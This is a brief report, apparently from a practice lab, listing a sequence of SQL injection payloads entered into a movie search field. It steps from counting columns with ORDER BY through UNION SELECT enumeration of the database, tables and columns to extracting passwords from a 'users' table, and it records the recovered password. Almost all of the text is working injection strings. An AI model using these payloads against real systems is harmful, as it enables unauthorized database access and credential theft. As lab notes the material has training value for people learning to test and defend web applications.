# Report

## SQL Injection Attempts

1. `'Iron Man' order by 7-- -`
   - Error encountered at: `'Iron Man' order by 8-- -`

2. `'Iron Man' union select 1,2,3,4,5,6,7-- -`

3. `'Iron Man' union select 1,2,3,4,database(),6,7-- -`

4. `'Iron Man' union select 1,2,3,4,(table_name),6,7 from information_schema.table_constraints-- -`

5. `'Iron Man' union select 1,2,3,4,(column_name),6,7 from information_schema.columns where table_name='users'-- -`

6. `'Iron Man' union select 1,2,3,4,(password),6,7 from users-- -`

Password: `bug`
